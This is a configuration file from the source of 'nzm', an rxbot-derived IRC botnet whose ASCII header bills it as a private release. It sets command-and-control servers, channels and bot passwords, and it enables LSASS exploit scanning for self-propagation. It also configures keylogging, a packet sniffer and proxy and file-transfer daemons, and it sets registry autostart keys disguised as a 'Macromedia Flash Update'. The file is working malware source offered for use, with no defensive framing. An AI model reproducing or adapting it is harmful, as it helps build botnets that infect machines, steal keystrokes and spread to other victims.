/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.10.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/
// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 12522;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 6388;				// Port # for tftp daemon to run on
int httpport = 7088;			// Port # for http daemon to run on
int rloginport = 2692;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 6;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\system.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char lsaip[] = "";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "8652";			// cftp port ".lsaport 6969"
char lsuser[] = "enz";
char lspass[] = "yme";

// these have been tested and give best results, DON'T CHANGE!

SCANALL scanall[]={
{"lsass_445", true},
{"ls1ls", true},
{"msass", true},
{NULL, false}
};

//

char botid[] = "botid";						// bot id
char version[] = "nzm v0.5 beta";		// Bots !version reply
char password[] = "password";					// bot password
char server[] = "irc.server.com";		// server
char serverpass[] = "";						// server password
char channel[] = "#channel";				// channel that the bot should join
char chanpass[] = "chankey";						// channel password
char server2[] = "irc2.server.com";						// backup server (optional)
char channel2[] = "#channel";						// backup channel (optional)
char chanpass2[] = "chankey";						// backup channel password (optional)
char filename[] = "file.exe";			// destination file name *** your payload should match this too ***
char keylogfile[] = "cvbei.dll";				// keylog filename
char valuename[] = "Macromedia Flash Update";		// value name for autostart
char nickconst[] = "[bot]-";					// first part to the bot's nick
char szLocalPayloadFile[]="file.exe";	// **** make this the same as your bot filename! ****
char modeonconn[] = "+xi";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#botexp";					// Channel where exploit messages get redirected
char keylogchan[] = "#botkey";						// Channel where keylog messages get redirected
char psniffchan[] = "#botsniff";						// Channel where psniff messages get redirected

char *authost[] = {
	"*@*1.3.3.7"
};

char *versionlist[] = {
	"roffer v1.2b24 [20031215140650], http://iroffer.org/",
	};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw3e0"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
